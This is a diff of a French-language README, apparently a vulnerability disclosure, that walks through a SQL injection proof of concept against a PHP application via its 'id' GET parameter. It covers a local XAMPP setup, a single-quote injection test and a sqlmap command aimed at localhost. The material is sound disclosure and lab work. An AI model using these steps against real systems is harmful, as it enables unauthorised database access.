@@ -22,10 +22,27 @@ ou d'exploiter les dernières vulnérabilités de la base de données sous-jacen
 ####Paramètre vulnérable : id (GET)
 
 ###2. Preuve de concept :
-Etape 1- Installation de l’application web vulnérable
+###Etape 1- Installation de l’application web vulnérable
 Pour cette étape nous essayerons de déployer l’application sur xampp.
 
 
 On cré une base de donnée portant le nom de #####spms_db
 ![Capture d’écran du 2023-06-07 12-14-55](https://github.com/rozzario/Sql-injection/assets/36795507/29b5a31f-3d3c-48f8-937c-ca2cf1810f6d)
+
+Puis on importe le contenu de la base de donnée:
+![Capture d’écran du 2023-06-07 12-16-15](https://github.com/rozzario/Sql-injection/assets/36795507/65edaaf6-f0e1-4148-a100-bb11a4d76f4c)
+
+Une fois que c’est fait, on déploie l’application en copiant le dossier du site web dans le répertoire htdocs de xampp. On obtient donc ceci:
+![Capture d’écran du 2023-06-07 12-18-00](https://github.com/rozzario/Sql-injection/assets/36795507/1391e28f-96d0-413d-849c-15c078e52d51)
+
+###Étape 2 - En visitant l'url :
+http://localhost/php-spms/?page=services/view&id=2, il suffit d'ajouter un guillemet simple pour
+vérifier l'injection SQL.
+![Capture d’écran du 2023-06-07 12-18-53](https://github.com/rozzario/Sql-injection/assets/36795507/7cd464c3-0634-4e6d-8c8b-6a0c8880c245)
+![Capture d’écran du 2023-06-07 12-19-24](https://github.com/rozzario/Sql-injection/assets/36795507/62b380b6-18ea-444c-84f4-a921a93210ee)
+
+###Etape 3 - Exécuter sqlmap -u " http://localhost/php-spms/?page=services/view&id=2"
+-p id --dbms=mysql
+
+
 
